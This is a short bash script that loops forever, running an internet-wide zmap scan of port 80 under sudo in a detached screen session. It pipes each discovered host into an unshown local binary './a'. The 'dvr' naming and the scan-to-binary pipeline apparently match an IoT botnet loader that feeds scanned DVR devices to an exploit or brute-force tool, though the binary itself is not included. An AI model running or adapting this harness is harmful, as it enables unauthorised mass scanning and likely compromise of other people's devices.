#!/bin/bash
while true; do
    rm -f dvr.txt
    screen -dmS dvr bash -c 'sudo zmap -p80 -q 2> dvr.txt | ./a 80'
    echo "Start"
    while ! grep -q "\[INFO\] zmap: completed" dvr.txt 2>/dev/null; do
        if ! pgrep -f zmap > /dev/null; then
            break
        fi
        sleep 60
    done
    pkill -f dvr
    pkill -f zmap
    echo "End"
done
